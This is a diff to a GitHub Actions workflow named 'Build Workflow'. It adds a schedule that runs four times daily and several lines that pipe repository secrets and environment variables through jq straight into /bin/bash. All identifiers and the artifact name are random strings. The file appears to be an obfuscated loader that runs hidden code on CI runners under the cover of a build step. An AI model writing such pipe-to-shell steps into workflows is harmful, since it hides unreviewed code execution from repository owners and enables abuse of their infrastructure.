@@ -2,6 +2,8 @@ name: Build Workflow
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '14 0,6,12,18 * * *'
 env:
   CI: true
 concurrency:
@@ -14,16 +16,18 @@ jobs:
       - uses: actions/checkout@v4
       - name: Execute
         env:
-          xkfr58: ${{ secrets.xkfr58 }}
+          w53096: ${{ secrets.w53096 }}
         run: |
-          printf '%s' "$xkfr58" | jq -r .orrkc8697 | /bin/bash
-          echo $gtnzl974 | jq -r .kqozi76824 | /bin/bash
-          echo $mkf320 | jq -r .q2891 | /bin/bash
-          printf '%s' "$fq6" | jq -r .cedcn5920 | /bin/bash
+          printf '%s' "$w53096" | jq -r .xegk95 | /bin/bash
+          echo $ijq2557 | jq -r .zrv821 | /bin/bash
+          echo $wc93 | jq -r .y2 | /bin/bash
+          echo $ix1 | jq -r .o41 | /bin/bash
+          printf '%s' "$m48" | jq -r .uokku6 | /bin/bash
+          printf '%s' "$xwhd70" | jq -r .vhp271 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
         with:
-          name: X8HaoQW9
+          name: yhqasjth
           path: "*.zip"
           retention-days: 1
